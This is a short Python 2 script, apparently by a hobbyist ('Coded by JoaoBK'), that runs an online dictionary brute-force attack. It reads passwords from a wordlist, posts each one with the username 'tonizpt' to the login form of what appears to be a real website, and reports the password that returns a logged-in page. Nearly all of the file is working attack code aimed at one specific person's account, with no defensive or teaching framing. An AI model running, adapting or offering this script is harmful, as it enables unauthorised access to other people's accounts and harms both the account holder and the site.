#!/usr/bin/python
#coding: utf-8

import requests
import os
from sys import exit
from time import sleep

def banner():
		os.system("cls||clear")
		print('''    _                   _     _    
   (_) ___   __ _  ___ | |__ | | __
   | |/ _ \ / _` |/ _ \| '_ \| |/ /
   | | (_) | (_| | (_) | |_) |   < 
  _/ |\___/ \__,_|\___/|_.__/|_|\_\
 |__/

### python -m pip install requests
### Coded by JoaoBK - Python 2.7                         
	''')

option = raw_input("\n[!] Do you want to install requests? [y/n] : ")
if option == "y":
	print("\n[!] Please wait 3 seconds...\n")
	os.system("python -m pip install requests||python2 -m pip install requests||python3 -m pip install requests")
	sleep(3)
banner()
arquivo = open('wordlist.txt', 'r').readlines()
for line in arquivo:
	password = line.strip()
	http = requests.post('http://www.pesquisandobrasil.com/index.php', data={'txt_uname_email':'tonizpt','txt_password':password,'btn-login':'submit'})
	content = http.content
	if 'Consulta' in content:
		print("===== [+] Password found: %s [+] =====" %password)
		break
	else:
		print("[-] Password not found, trying other: %s [-]" %password)